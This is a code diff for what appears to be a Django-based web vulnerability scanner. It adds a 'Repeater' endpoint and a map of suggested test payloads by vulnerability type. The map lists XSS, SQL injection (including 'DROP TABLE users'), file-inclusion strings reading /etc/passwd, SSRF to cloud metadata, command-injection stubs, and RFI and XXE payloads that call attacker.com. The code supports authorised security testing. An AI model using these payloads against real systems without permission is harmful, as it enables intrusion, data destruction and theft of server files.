@@ -9,6 +9,7 @@ from django.utils import timezone
 from django.conf import settings
 import os
 import html as _html
+import json
 import logging
 from celery.result import AsyncResult
 from scanner.tasks import async_exploit_all_vulnerabilities, async_exploit_selected_vulnerabilities, async_scan_task
@@ -1340,3 +1341,241 @@ def scan_chain_suggestions(request, scan_id):
         'by_finding': by_finding_str,
         'disclaimer': result['disclaimer'],
     }, status=200)
+
+
+# ---------------------------------------------------------------------------
+# Repeater advice payloads by vulnerability type
+# ---------------------------------------------------------------------------
+
+_REPEATER_ADVICE_MAP = {
+    'xss': {
+        'what_to_change': 'Modify the `{parameter}` parameter with XSS payloads to test for Cross-Site Scripting.',
+        'suggested_payloads': [
+            '<script>alert(1)</script>',
+            '"><img src=x onerror=alert(1)>',
+            "'><svg onload=alert(1)>",
+            '<iframe src="javascript:alert(1)">',
+        ],
+    },
+    'sqli': {
+        'what_to_change': 'Modify the `{parameter}` parameter with SQL injection payloads.',
+        'suggested_payloads': [
+            "' OR '1'='1",
+            "' OR 1=1--",
+            "' UNION SELECT NULL--",
+            "1; DROP TABLE users--",
+        ],
+    },
+    'lfi': {
+        'what_to_change': 'Modify the `{parameter}` parameter with local file inclusion payloads.',
+        'suggested_payloads': [
+            '../../../etc/passwd',
+            '....//....//....//etc/passwd',
+            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
+            '/etc/passwd%00',
+        ],
+    },
+    'rfi': {
+        'what_to_change': 'Modify the `{parameter}` parameter with a remote URL to test for Remote File Inclusion.',
+        'suggested_payloads': [
+            'http://attacker.com/shell.php',
+            'http://attacker.com/shell.php%00',
+        ],
+    },
+    'ssrf': {
+        'what_to_change': 'Modify the `{parameter}` parameter with internal/cloud metadata URLs to test for SSRF.',
+        'suggested_payloads': [
+            'http://169.254.169.254/latest/meta-data/',
+            'http://127.0.0.1/',
+            'http://[::1]/',
+            'http://localhost/',
+        ],
+    },
+    'rce': {
+        'what_to_change': 'Modify the `{parameter}` parameter with command injection payloads to test for RCE.',
+        'suggested_payloads': [
+            '; id',
+            '| id',
+            '`id`',
+            '$(id)',
+        ],
+    },
+    'open_redirect': {
+        'what_to_change': 'Modify the `{parameter}` parameter with redirect targets to test for Open Redirect.',
+        'suggested_payloads': [
+            'https://evil.com',
+            '//evil.com',
+            '/\\evil.com',
+            'https:evil.com',
+        ],
+    },
+    'xxe': {
+        'what_to_change': 'Modify the XML body to include an external entity declaration to test for XXE.',
+        'suggested_payloads': [
+            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
+            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><data>&xxe;</data>',
+        ],
+    },
+    'csrf': {
+        'what_to_change': 'Remove the CSRF token from the request headers or body and resubmit to test for CSRF.',
+        'suggested_payloads': [],
+    },
+    'cors': {
+        'what_to_change': 'Modify the Origin header to an attacker-controlled domain and inspect the Access-Control-Allow-Origin response header.',
+        'suggested_payloads': [
+            'Origin: https://attacker.com',
+            'Origin: null',
+        ],
+    },
+    'crlf': {
+        'what_to_change': 'Inject CRLF characters into the `{parameter}` parameter to test for CRLF Injection.',
+        'suggested_payloads': [
+            '%0d%0aSet-Cookie: injected=true',
+            '%0d%0aContent-Length: 0%0d%0a%0d%0a',
+        ],
+    },
+    'idor': {
+        'what_to_change': 'Modify the `{parameter}` parameter to access other users\' resources (IDOR).',
+        'suggested_payloads': ['1', '2', '100', '0', '-1'],
+    },
+    'path_traversal': {
+        'what_to_change': 'Modify the `{parameter}` parameter with path traversal sequences.',
+        'suggested_payloads': [
+            '../../../etc/passwd',
+            '..\\..\\..\\windows\\win.ini',
+            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
+        ],
+    },
+    'info_disclosure': {
+        'what_to_change': 'Inspect response headers and body for sensitive information leakage.',
+        'suggested_payloads': [],
+    },
+    'host_header': {
+        'what_to_change': 'Modify the Host header to an attacker-controlled domain.',
+        'suggested_payloads': [
+            'Host: attacker.com',
+            'Host: localhost',
+        ],
+    },
+    'jwt': {
+        'what_to_change': 'Modify the JWT token to use algorithm "none" or a weak secret.',
+        'suggested_payloads': [
+            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.',
+        ],
+    },
+    'deserialization': {
+        'what_to_change': 'Replace the serialized object in the `{parameter}` parameter with a crafted gadget chain payload.',
+        'suggested_payloads': [],
+    },
+    'bac': {
+        'what_to_change': 'Modify the `{parameter}` parameter or change the user role/ID to test for Broken Access Control.',
+        'suggested_payloads': ['admin', 'superuser', '1', '0'],
+    },
+    'unsafe_upload': {
+        'what_to_change': 'Upload a file with a dangerous extension or content-type to test for Unsafe File Upload.',
+        'suggested_payloads': ['shell.php', 'test.php5', 'malware.jsp'],
+    },
+}
+
+
+def _build_repeater_advice(vuln):
+    """
+    Build intelligent advice for manual testing in the Repeater.
+
+    Returns a dict with 'what_to_change' and 'suggested_payloads' keys.
+    Successful payloads from the scan are prepended to the suggestions.
+    """
+    vuln_type = (getattr(vuln, 'vulnerability_type', '') or '').lower()
+    parameter = getattr(vuln, 'parameter', '') or 'input'
+    successful_payloads = list(getattr(vuln, 'successful_payloads', None) or [])
+
+    template = _REPEATER_ADVICE_MAP.get(vuln_type, {
+        'what_to_change': 'Modify the `{parameter}` parameter to test for {vuln_type} vulnerabilities.',
+        'suggested_payloads': [],
+    })
+
+    what_to_change = template['what_to_change'].format(
+        parameter=parameter,
+        vuln_type=vuln.get_vulnerability_type_display() if vuln_type else 'unknown',
+    )
+
+    extra = [p for p in template['suggested_payloads'] if p not in successful_payloads]
+    combined_payloads = (successful_payloads + extra)[:10]
+
+    return {
+        'what_to_change': what_to_change,
+        'suggested_payloads': combined_payloads,
+    }
+
+
+@api_view(['POST'])
+@authentication_classes([TokenAuthentication, SessionAuthentication])
+@permission_classes([IsAuthenticated])
+def send_to_repeater(request, vuln_id):
+    """
+    Forward a vulnerability's HTTP request to the Repeater tool.
+
+    Looks up the Vulnerability by ID, extracts (or reconstructs) its HTTP
+    request data, creates a new RepeaterRequest, and returns the request ID
+    together with intelligent advice on what to change for manual testing.
+
+    POST /scanner/api/vulnerabilities/<vuln_id>/send-to-repeater/
+
+    Response (201):
+        repeater_request_id  – ID of the newly created RepeaterRequest
+        repeater_url         – URL of the Repeater dashboard
+        message              – Human-readable confirmation
+        advice               – Dict with 'what_to_change' and 'suggested_payloads'
+    """
+    try:
+        vuln = Vulnerability.objects.get(id=vuln_id)
+    except Vulnerability.DoesNotExist:
+        return Response({'error': 'Vulnerability not found'}, status=404)
+
+    from repeater.models import RepeaterRequest as _RepeaterRequest
+
+    # --- Extract HTTP request data ----------------------------------------
+    http_traffic = vuln.http_traffic or {}
+    req_data = http_traffic.get('request', {})
+
+    if req_data:
+        method = req_data.get('method', 'GET') or 'GET'
+        url = req_data.get('url', '') or vuln.url or ''
+        headers = req_data.get('headers', {})
+        body = req_data.get('body', '') or ''
+    else:
+        # Fall back: reconstruct a minimal request from vulnerability fields
+        method = 'GET'
+        url = vuln.url or ''
+        headers = {}
+        body = ''
+        payloads = list(vuln.successful_payloads or [])
+        if payloads and vuln.parameter:
+            body = f'{vuln.parameter}={payloads[0]}'
+
+    # Normalise headers to a JSON string
+    if isinstance(headers, dict):
+        headers_str = json.dumps(headers)
+    elif isinstance(headers, str):
+        headers_str = headers
+    else:
+        headers_str = '{}'
+
+    # --- Create the RepeaterRequest ----------------------------------------
+    vuln_type_display = vuln.get_vulnerability_type_display()
+    name = f'[Scanner] {vuln_type_display} - {url}'[:255]
+
+    repeater_req = _RepeaterRequest.objects.create(
+        url=url,
+        method=method,
+        headers=headers_str,
+        body=body,
+        name=name,
+    )
+
+    return Response({
+        'repeater_request_id': repeater_req.id,
+        'repeater_url': '/repeater/',
+        'message': f'Request forwarded to Repeater as "{name}"',
+        'advice': _build_repeater_advice(vuln),
+    }, status=201)
